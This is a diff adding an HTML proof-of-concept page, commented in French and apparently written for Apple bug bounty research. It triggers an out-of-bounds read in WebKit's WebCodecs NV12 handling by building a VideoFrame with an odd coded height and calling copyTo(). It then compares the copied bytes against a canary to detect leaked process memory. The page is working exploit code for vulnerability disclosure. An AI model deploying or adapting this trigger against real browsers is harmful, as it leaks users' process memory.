@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<title>PoC — WebCodecs OOB Read (Bug #5)</title>
+<style>
+  body { font-family: monospace; background: #111; color: #ccc; padding: 2rem; line-height: 1.7; }
+  h2   { color: #fff; font-size: 1rem; margin: 0 0 1rem; }
+  pre  { background: #1a1a1a; border: 1px solid #333; border-radius: 4px; padding: 1rem;
+         overflow-x: auto; font-size: 13px; }
+  .ok   { color: #4caf50; }
+  .bug  { color: #f44336; font-weight: bold; }
+  .warn { color: #ff9800; }
+  .info { color: #64b5f6; }
+  .row  { display: flex; gap: 1rem; }
+  .box  { flex: 1; background: #1e1e1e; border: 1px solid #333; border-radius: 4px; padding: .75rem; }
+  .label { font-size: 11px; color: #888; text-transform: uppercase; letter-spacing: .05em; margin-bottom: .4rem; }
+</style>
+</head>
+<body>
+
+<h2>PoC — WebCodecs NV12 OOB Read (Bug #5) — Apple Bug Bounty Research</h2>
+<pre id="log">Initialisation...</pre>
+
+<div class="row" style="margin-top:1rem">
+  <div class="box">
+    <div class="label">Buffer source (20 octets)</div>
+    <pre id="src-vis" style="margin:0;border:none;background:none;padding:0"></pre>
+  </div>
+  <div class="box">
+    <div class="label">Buffer destination après copyTo()</div>
+    <pre id="dst-vis" style="margin:0;border:none;background:none;padding:0"></pre>
+  </div>
+</div>
+
+<script>
+const L = document.getElementById('log');
+const append = (cls, txt) => {
+  const s = document.createElement('span');
+  if (cls) s.className = cls;
+  s.textContent = txt + '\n';
+  L.appendChild(s);
+};
+const hex = b => b.toString(16).padStart(2,'0').toUpperCase();
+const hexRow = (arr, from, to, marker) => {
+  let s = '';
+  for (let i = from; i < to; i++) {
+    s += hex(arr[i]);
+    if (i < to-1) s += ' ';
+  }
+  return s + (marker ? '  ← ' + marker : '');
+};
+
+async function run() {
+  L.textContent = '';
+
+  // ── 1. Vérification support WebCodecs ──────────────────────────────────────
+  if (typeof VideoFrame === 'undefined') {
+    append('warn', '❌  WebCodecs non supporté (Safari 16+ requis, contexte sécurisé HTTPS/localhost).');
+    return;
+  }
+  append('info', '✅  WebCodecs disponible.');
+
+  // ── 2. Paramètres du frame piégé ───────────────────────────────────────────
+  // codedHeight = 3 (impair) est le déclencheur :
+  //   CVPixelBuffer UV = floor(3/2) = 1 ligne réelle
+  //   computeLayoutAndAllocationSize UV = ceil(3/2) = 2 lignes demandées
+  const W = 4, H = 3;
+  append('info', `\n── Paramètres ──────────────────────────────────`);
+  append(null, `   format      : NV12`);
+  append(null, `   codedWidth  : ${W}`);
+  append(null, `   codedHeight : ${H}  (impair — déclencheur)`);
+  append(null, `   UV réel     : floor(${H}/2) = ${Math.floor(H/2)} ligne(s)`);
+  append(null, `   UV demandé  : ceil(${H}/2)  = ${Math.ceil(H/2)} ligne(s)  ← divergence`);
+
+  // ── 3. Construction du buffer source ───────────────────────────────────────
+  // Layout source (calculé avec ceil) :
+  //   Y  : W * H             = 4*3 = 12 octets  [0..11]
+  //   UV : W * ceil(H/2)     = 4*2 = 8  octets  [12..19]
+  //   Total = 20 octets
+  //
+  //   createNV12() ne copie QUE 1 ligne UV dans le CVPixelBuffer :
+  //     positions 12..15 → UV plane du CVPixelBuffer
+  //     positions 16..19 (canary 0x42) → JAMAIS écrites dans le CVPixelBuffer
+  const CANARY = 0x42;
+  const src = new Uint8Array(20);
+  src.fill(0xAA, 0, 12);         // Y  : pattern 0xAA
+  src.fill(0xBB, 12, 16);        // UV ligne 0 : pattern 0xBB
+  src.fill(CANARY, 16, 20);      // UV ligne 1 : CANARY — ne rentre JAMAIS dans CVPixelBuffer
+
+  document.getElementById('src-vis').textContent =
+    `Y  [00..11] : ${hexRow(src, 0, 12, '0xAA')}\n` +
+    `UV [12..15] : ${hexRow(src, 12, 16, '0xBB — copié dans CVPixelBuffer')}\n` +
+    `UV [16..19] : ${hexRow(src, 16, 20, `0x${hex(CANARY)} CANARY — IGNORÉ par createNV12()`)}`;
+
+  append('info', `\n── Création VideoFrame ─────────────────────────`);
+
+  // ── 4. Création du VideoFrame ───────────────────────────────────────────────
+  let frame;
+  try {
+    frame = new VideoFrame(src.buffer, {
+      format: 'NV12',
+      codedWidth: W,
+      codedHeight: H,
+      timestamp: 0,
+    });
+    append('ok', `   ✅  VideoFrame NV12 ${W}×${H} créé.`);
+    append(null,  `   codedWidth  = ${frame.codedWidth}`);
+    append(null,  `   codedHeight = ${frame.codedHeight}`);
+  } catch (e) {
+    append('bug', `   ❌  Création refusée : ${e}`);
+    append('warn', '   → Ce navigateur valide peut-être la parité de codedHeight (bug patché ?)');
+    return;
+  }
+
+  // ── 5. allocationSize() ─────────────────────────────────────────────────────
+  const allocSize = frame.allocationSize();
+  append('info', `\n── allocationSize() ────────────────────────────`);
+  append(null, `   Retourne : ${allocSize} octets`);
+  if (allocSize === 20) {
+    append('ok', `   ✅  Correspond à ceil(H/2)=2 : 12 (Y) + 8 (UV×2) = 20`);
+    append('warn',`   ⚠️  Sous-estime la taille du CVPixelBuffer réel (UV a 1 ligne, pas 2)`);
+  } else {
+    append('warn', `   Valeur inattendue : ${allocSize}`);
+  }
+
+  // ── 6. copyTo() ─────────────────────────────────────────────────────────────
+  append('info', `\n── copyTo() ────────────────────────────────────`);
+  const dst = new ArrayBuffer(allocSize);
+
+  try {
+    const layouts = await frame.copyTo(dst);
+    append('ok', `   ✅  copyTo() a résolu — le bug a été traversé sans crash.`);
+    append(null,  `   layouts = ${JSON.stringify(layouts)}`);
+  } catch (e) {
+    append('bug', `   ❌  copyTo() a rejeté : ${e}`);
+    append('warn', '   → Possible que le navigateur ait patchée ou que le format soit refusé.');
+    frame.close();
+    return;
+  }
+
+  // ── 7. Analyse du buffer destination ───────────────────────────────────────
+  const dstView = new Uint8Array(dst);
+  const uvRow1 = Array.from(dstView.slice(16, 20));
+  const allCanary = uvRow1.every(b => b === CANARY);
+
+  document.getElementById('dst-vis').textContent =
+    `Y  [00..11] : ${hexRow(dstView, 0, 12, '')}\n` +
+    `UV [12..15] : ${hexRow(dstView, 12, 16, 'ligne 0 UV (normale)')}\n` +
+    `UV [16..19] : ${hexRow(dstView, 16, 20, allCanary ? 'COÏNCIDENCE avec canary (?!)' : '← depuis mémoire heap du processus')}`;
+
+  append('info', `\n── Résultat ────────────────────────────────────`);
+  append(null,  `   Canary 0x${hex(CANARY)} dans src[16..19] ? OUI (jamais écrit dans CVPixelBuffer)`);
+  append(null,  `   UV ligne 1 en sortie   : ${uvRow1.map(b=>'0x'+hex(b)).join(' ')}`);
+
+  if (!allCanary) {
+    append('bug', `\n🔴  BUG CONFIRMÉ`);
+    append('bug', `   dst[16..19] ≠ 0x${hex(CANARY)} ← ne vient PAS de notre buffer source.`);
+    append('bug', `   Ces octets ont été lus APRÈS le plan UV du CVPixelBuffer (1 ligne)`);
+    append('bug', `   dans la mémoire du processus WebContent.`);
+    append('bug', `   → OOB Read / Information Disclosure (VideoFrameCV.mm :: copyNV12)`);
+    append('bug', `   → Reportable : Apple Security Bounty – WebKit`);
+  } else {
+    append('warn', `\n⚠️  dst[16..19] == 0x${hex(CANARY)} — coïncidence OU mémoire zéro`);
+    append('warn', `   Relancer plusieurs fois ou essayer W=8, H=5 / H=7 pour d'autres patterns.`);
+    append('warn', `   Le bug est présent (copyTo a réussi sur un frame UV à 1 ligne réelle),`);
+    append('warn', `   mais les octets après le plan UV étaient 0x${hex(CANARY)} par chance.`);
+  }
+
+  append('info', `\n── Versions à tester ───────────────────────────`);
+  append(null,  `   Safari stable → vérifie si bug présent`);
+  append(null,  `   Safari Technology Preview → vérifie si déjà patché`);
+  append(null,  `   Comparer les deux résultats → valide la régression`);
+
+  frame.close();
+}
+
+run().catch(e => append('bug', 'Erreur inattendue : ' + e));
+</script>
+</body>
+</html>
